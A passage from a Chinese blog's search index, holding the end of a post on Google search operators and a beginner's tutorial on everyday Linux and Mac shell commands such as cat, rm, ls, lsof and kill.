/></h2><p>如果我们查找的内容包含多个关键字，那么 AND 就派上用场了。</p><p>比如，搜索：<strong>React AND CSS</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640835326424-da805970-ef7e-4a23-b3d8-3f5e71961a32.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640835326424-da805970-ef7e-4a23-b3d8-3f5e71961a32.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="SskjL"></a></p><h2 id="8-查找其中一个关键字（OR）"><a href="#8-查找其中一个关键字（OR）" class="headerlink" title="8. 查找其中一个关键字（OR）"></a>8. 查找其中一个关键字（OR）<br /><br /></h2><p>可以使用 OR 来查询多个关键词中的一个。</p><p>比如，搜索：<strong>React OR Vue</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640862345880-70c61cf9-32e9-4d80-a9ba-082f3610addd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640862345880-70c61cf9-32e9-4d80-a9ba-082f3610addd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="AVV83"></a></p><h2 id="9-查询关键字的定义（Define）"><a href="#9-查询关键字的定义（Define）" class="headerlink" title="9. 查询关键字的定义（Define）"></a>9. 查询关键字的定义（Define）<br /><br /></h2><p>可以使用 Define 关键词来查搜索关键词的定义。</p><p>比如，搜索：<strong>Define: JavaScript</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640862520213-31619953-e4d4-483f-b5a6-2a037a165e1d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640862520213-31619953-e4d4-483f-b5a6-2a037a165e1d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Xg7Ew"></a></p><h2 id="10-搜索相关内容（-）"><a href="#10-搜索相关内容（-）" class="headerlink" title="10. 搜索相关内容（+）"></a>10. 搜索相关内容（+）<br /><br /></h2><p>如果我们想要搜索多个相关的关键词时，就可以使用加号来连接多个相关的关键词。</p><p>比如，搜索：<strong>CSS style+React</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640862900031-df3104ee-f674-40dc-ace4-84c069db613b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640862900031-df3104ee-f674-40dc-ace4-84c069db613b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="INXbQ"></a></p><h2 id="11-查找相似网站（related）"><a href="#11-查找相似网站（related）" class="headerlink" title="11. 查找相似网站（related）"></a>11. 查找相似网站（related）<br /><br /></h2><p>可以使用 related 关键字来查询与指定站点相似的站点。</p><p>比如，搜索：<strong>related: w3schools.com</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640863092834-dd9a4477-b743-4bb7-a2dd-9a614a5b32fd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640863092834-dd9a4477-b743-4bb7-a2dd-9a614a5b32fd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Hns4a"></a></p><h2 id="12-搜索指定站点内容（site）"><a href="#12-搜索指定站点内容（site）" class="headerlink" title="12. 搜索指定站点内容（site）"></a>12. 搜索指定站点内容（site）<br /><br /></h2><p>可以使用 site 关键字来搜索指定站点中的内容。</p><p>比如，搜索：<strong>site: github.com React</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640863491550-b2ee9f7f-b0cf-4853-be51-4f8a75d87780.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640863491550-b2ee9f7f-b0cf-4853-be51-4f8a75d87780.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Z10t3"></a></p><h2 id="13-搜索指定时间范围（before、after）"><a href="#13-搜索指定时间范围（before、after）" class="headerlink" title="13. 搜索指定时间范围（before、after）"></a>13. 搜索指定时间范围（before、after）<br /><br /></h2><p>可以使用 after 来搜索指定时间之后的内容，使用 before 搜索指定时间之前的内容。</p><p>比如，搜索：<strong>after: 2021 learn react</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640863899601-51e83fec-dbce-4109-bda8-800333b0072c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640863899601-51e83fec-dbce-4109-bda8-800333b0072c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 命令</title>
      <link href="/2023/07/02/frontend/collection/skill/linux-ming-ling/"/>
      <url>/2023/07/02/frontend/collection/skill/linux-ming-ling/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>Linux 命令是在命令行上运行的程序。命令行是接受文本行并将其处理成计算机指令的界面。任何图形用户界面 (GUI) 都是命令行程序的抽象。通过 GUI 进行多步骤处理的任务可以通过在 CLI 中键入命令在几秒钟内完成。因此，学习基本的命令行有助于提升工作效率。</p><p>相信很多小伙伴使用 Mac 做开发，由于 Mac 是基于 unix 的，所以 Mac 的多数命令与 linux 是通用的。所以，下面列举的多数命令是可以在 Mac 中使用的。</p><p><a name="rFPWy"></a></p><h1 id="一、文件管理"><a href="#一、文件管理" class="headerlink" title="一、文件管理"></a>一、文件管理</h1><p><a name="PEzIJ"></a></p><h3 id="1-cat"><a href="#1-cat" class="headerlink" title="1. cat"></a>1. cat</h3><p>cat 命令用于连接文件并打印到标准输出设备上。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat index.<span class="property">html</span></span><br></pre></td></tr></table></figure><p><br />使用<code>cat &gt; filename c</code>可以创建一个新文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; style.<span class="property">css</span>;</span><br></pre></td></tr></table></figure><p><br />使用 <code>cat filename1 filename2 &gt;&gt; filename3</code> 可以连接两个文件（1 和 2）并将它们的输出内容存储在一个新文件 3 中。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat filename1 filename2 &gt;&gt; filename3</span><br></pre></td></tr></table></figure><p><a name="thE3l"></a></p><h3 id="2-rmdir"><a href="#2-rmdir" class="headerlink" title="2. rmdir"></a>2. rmdir</h3><p>rmdir 命令用于删除空的目录。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130973660-f6053448-a67b-4d7e-b839-e96679b00bcb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130973660-f6053448-a67b-4d7e-b839-e96679b00bcb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="ARk7D"></a></p><h3 id="3-rm"><a href="#3-rm" class="headerlink" title="3. rm"></a>3. rm</h3><p>rm 命令用于删除一个文件或者目录。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130814639-094cafac-fbbc-4a4c-a3a7-bc60915f6fc8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130814639-094cafac-fbbc-4a4c-a3a7-bc60915f6fc8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们还可以使用 <code>rm -rf</code>命令来快速删除文件夹&#x2F;目录及其内容。</p><p>注意：使用此命令需要非常小心，并仔细检查所在的目录。这个操作将删除所有内容并且无法撤消。</p><p><a name="GeDMJ"></a></p><h3 id="4-touch"><a href="#4-touch" class="headerlink" title="4. touch"></a>4. touch</h3><p>touch 命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130657315-1606b28c-4091-46b0-b838-a91fa1a747e7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130657315-1606b28c-4091-46b0-b838-a91fa1a747e7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>如果不添加任何参数，就会将文件的修改时间改为当前的系统时间。</p><p><a name="hi6BD"></a></p><h3 id="5-cp"><a href="#5-cp" class="headerlink" title="5. cp"></a>5. cp</h3><p>cp 命令主要用于复制文件或目录。使用该指令复制目录时，必须使用参数 -r 或者 -R 。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643131421038-4148ebf5-51bc-4086-a1f3-cbccb45eb7ff.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643131421038-4148ebf5-51bc-4086-a1f3-cbccb45eb7ff.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里复制了 test 目录，并重命名为了 test1，test1 目录中也包含 test 目录中所有的内容。</p><p><a name="URbks"></a></p><h3 id="6-mv"><a href="#6-mv" class="headerlink" title="6. mv"></a>6. mv</h3><p>mv 命令用来为文件或目录改名（如果目录名称不存在）、或将文件或目录移入其它位置。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643131657812-a2576ff2-af76-4229-90f7-f4bb28a1a7c2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643131657812-a2576ff2-af76-4229-90f7-f4bb28a1a7c2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里将 test1 文件移动到了 test 文件中。</p><p><a name="qOC2f"></a></p><h3 id="7-locate"><a href="#7-locate" class="headerlink" title="7. locate"></a>7. locate</h3><p>locate 命令用于查找符合条件的文档，他会去保存文档和目录名称的数据库内，查找合乎范本样式条件的文档或目录。一般情况下，只需要输入 <code>locate file_name</code> 即可查找指定文件。</p><p><a name="x3E31"></a></p><h1 id="二、磁盘管理"><a href="#二、磁盘管理" class="headerlink" title="二、磁盘管理"></a>二、磁盘管理<br /><br /></h1><p><a name="RGX1x"></a></p><h3 id="1-cd"><a href="#1-cd" class="headerlink" title="1. cd"></a>1. cd</h3><p>cd 命令用于切换当前工作目录，需要与文件&#x2F;目录名称一起使用：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130080443-aa196f8b-899f-4a38-a9a9-6c97bb21535f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130080443-aa196f8b-899f-4a38-a9a9-6c97bb21535f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里的目录&#x2F;文件名称可以是一个绝对路径或者相对路径。若目录名称省略，则变换至使用者的 home 目录 (也就是刚 login 时所在的目录)。另外，~ 表示为 home 目录， . 表示目前所在的目录， .. 表示目前目录位置的上一层目录。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130252984-970191ec-94f0-4e24-96e0-0de8a0466c27.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643130252984-970191ec-94f0-4e24-96e0-0de8a0466c27.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="WwIqI"></a></p><h3 id="2-mkdir"><a href="#2-mkdir" class="headerlink" title="2. mkdir"></a>2. mkdir</h3><p>mkdir 命令用来在当前位置（当前目录）新建一个文件夹。只需使用该命令加上需要新建文件夹的名称即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir test</span><br></pre></td></tr></table></figure><p><br />下面是创建的结果，使用 ls 命令就可以看到刚创建的名为 test 的文件夹：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129628014-cf10fc92-8461-409f-a000-26f67c7e4972.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129628014-cf10fc92-8461-409f-a000-26f67c7e4972.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们还可以同时创建多个文件夹，只需在多个文件夹之间添加空格即可。如果一个文件夹名称中包含空格，就需要使用双引号来写这个文件夹名字：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129870234-f9ebad7c-d4b6-43d7-9b43-72588ca4e287.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129870234-f9ebad7c-d4b6-43d7-9b43-72588ca4e287.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="qLMB8"></a></p><h3 id="3-pwd"><a href="#3-pwd" class="headerlink" title="3. pwd"></a>3. pwd</h3><p>pwd 命令用来查看当前文件（文件夹）在文件系统中的绝对路径。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd / <span class="title class_">Users</span> / mac / <span class="title class_">Desktop</span> / 函数式编程;</span><br></pre></td></tr></table></figure><p><a name="l4Io3"></a></p><h3 id="4-ls"><a href="#4-ls" class="headerlink" title="4. ls"></a>4. ls</h3><p>ls 命令用来展示指定工作目录下之内容，会列出目前工作目录所含之文件及子目录。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ls</span><br><span class="line"></span><br><span class="line"><span class="title class_">FZLanTYJ</span>_Bold.<span class="property">OTF</span><span class="title class_">FZLanTYJ</span>_Heavy.<span class="property">OTF</span><span class="title class_">FZLanTYJ</span>_Medium.<span class="property">OTF</span></span><br><span class="line"><span class="title class_">FZLanTYJ</span>_DemiBold.<span class="property">OTF</span><span class="title class_">FZLanTYJ</span>_Light.<span class="property">OTF</span><span class="title class_">FZLanTYJ</span>_Regular.<span class="property">ttf</span></span><br></pre></td></tr></table></figure><p><br />我们还可以给 ls 命令添加参数，例如：<br />●ls -l<br />●ls -a</p><p>ls -l 命令会以长列表的形式来输出所有内容，使用该命令时，终端会输出所有文件的更多信息，比如权限、文件所有者、文件大小、日期等：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129071325-7daada22-5a3b-4bc1-b065-a587ba3ede89.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129071325-7daada22-5a3b-4bc1-b065-a587ba3ede89.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>ls -a 命令会列举出文件夹&#x2F;目录中所有的文件，包括隐藏文件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129224306-05bceb9d-c370-4a3c-b2a1-5f104dc4e43d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129224306-05bceb9d-c370-4a3c-b2a1-5f104dc4e43d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们还可以将两个参数放在一起使用，输出的结果将是两个参数分别执行时的效果和：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129354092-7d911728-5b45-4b6a-8513-21464844d6fd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643129354092-7d911728-5b45-4b6a-8513-21464844d6fd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以看到，输出的结果中包含了常规文件和隐藏文件的附加信息。</p><p><a name="xWKeU"></a></p><h1 id="三、系统设置"><a href="#三、系统设置" class="headerlink" title="三、系统设置"></a>三、系统设置<br /><br /></h1><p><a name="cLBZs"></a></p><h3 id="1-clear"><a href="#1-clear" class="headerlink" title="1. clear"></a>1. clear</h3><p>clear 命令用于清除屏幕。</p><p><a name="kogJg"></a></p><h3 id="2-uptime"><a href="#2-uptime" class="headerlink" title="2. uptime"></a>2. uptime</h3><p>在 linux 中，uptime 命令用来显示我们的系统运行了多少时间、当前登录的用户数，操作系统在过去的 1、5、15 分钟内的平均负载。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uptime</span><br><span class="line"></span><br><span class="line"><span class="number">22</span>:<span class="number">52</span>  up <span class="number">10</span> days,  <span class="number">8</span>:<span class="number">57</span>, <span class="number">2</span> users, load <span class="attr">averages</span>: <span class="number">4.63</span> <span class="number">4.15</span> <span class="number">3.13</span></span><br></pre></td></tr></table></figure><p><br />我们可以使用 uptime 来确定是服务器还是网络出了问题。例如如果网络应用程序运行，运行 uptime 来了解系统负载是否很高。如果负载不高，这个问题很有可能是由于网络引起的而非服务器。</p><p>可以使用 w 命令来代替 uptime。w 也提供关于当前系统登录用户和用户所进行工作的相关信息。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643122760570-67251f9a-52c9-4da9-9ee6-ff8cc1be7e16.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643122760570-67251f9a-52c9-4da9-9ee6-ff8cc1be7e16.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="VhxVw"></a></p><h3 id="3-users"><a href="#3-users" class="headerlink" title="3. users"></a>3. users</h3><p>users 命令用来显示系统当前登录的用户。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">users;</span><br><span class="line"></span><br><span class="line">mac;</span><br></pre></td></tr></table></figure><p><a name="gDIvc"></a></p><h3 id="4-lsof"><a href="#4-lsof" class="headerlink" title="4. lsof"></a>4. lsof</h3><p>lsof 命令用于查看端口占用情况：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -<span class="attr">i</span>:<span class="number">3000</span></span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643182192369-33d2b61b-49a3-4ec5-a2a5-e36ca5e8bf82.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643182192369-33d2b61b-49a3-4ec5-a2a5-e36ca5e8bf82.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="wYon3"></a></p><h3 id="5-df"><a href="#5-df" class="headerlink" title="5. df"></a>5. df</h3><p>df 命令用于显示目前在 Linux 系统上的文件系统磁盘使用情况统计。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643183166182-0c4e428e-71a7-43a1-a0c8-e5e69c5e10a3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643183166182-0c4e428e-71a7-43a1-a0c8-e5e69c5e10a3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="qWjcu"></a></p><h3 id="6-passwd"><a href="#6-passwd" class="headerlink" title="6. passwd"></a>6. passwd</h3><p>passwd 命令用来更改使用者的密码，需要根据提示输入一次旧密码和两次新密码。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185474056-e564f8eb-005a-4a89-895d-bf75c611251a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185474056-e564f8eb-005a-4a89-895d-bf75c611251a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="b58bF"></a></p><h3 id="7-cal"><a href="#7-cal" class="headerlink" title="7. cal"></a>7. cal</h3><p>cal 命令用于查看日历，默认只显示当前月份：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185850713-ca23325b-79b9-4ac5-8785-7391495303a7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185850713-ca23325b-79b9-4ac5-8785-7391495303a7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以使用<code>cal -y 2022</code>命令来显示某一年的日历：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185927667-6bc10a3d-80c8-484c-af15-03dadf0c4bf0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185927667-6bc10a3d-80c8-484c-af15-03dadf0c4bf0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="MmH3a"></a></p><h1 id="四、系统管理"><a href="#四、系统管理" class="headerlink" title="四、系统管理"></a>四、系统管理<br /><br /></h1><p><a name="PdjAM"></a></p><h3 id="1-date"><a href="#1-date" class="headerlink" title="1. date"></a>1. date</h3><p>date 命令用来查看当前系统的日期和时间，我们还可以格式化当前的时间：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643182744822-c36aa46a-3e7a-454f-9293-370d719841ab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643182744822-c36aa46a-3e7a-454f-9293-370d719841ab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="LStKe"></a></p><h3 id="2-kill"><a href="#2-kill" class="headerlink" title="2. kill"></a>2. kill</h3><p>kill 命令用于删除执行中的程序或工作。kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15)，可将指定程序终止。若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -<span class="number">9</span> <span class="number">3000</span></span><br></pre></td></tr></table></figure><p><a name="XRfY6"></a></p><h3 id="3-ps"><a href="#3-ps" class="headerlink" title="3. ps"></a>3. ps</h3><p>ps 命令用于显示当前进程的状态，类似于 windows 的任务管理器。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643183286473-d46320e1-2277-4a4c-b008-1b9d0b1da510.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643183286473-d46320e1-2277-4a4c-b008-1b9d0b1da510.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="qj8Hd"></a></p><h3 id="4-top"><a href="#4-top" class="headerlink" title="4. top"></a>4. top</h3><p>top 命令用于实时显示 process 的动态。</p><p><img 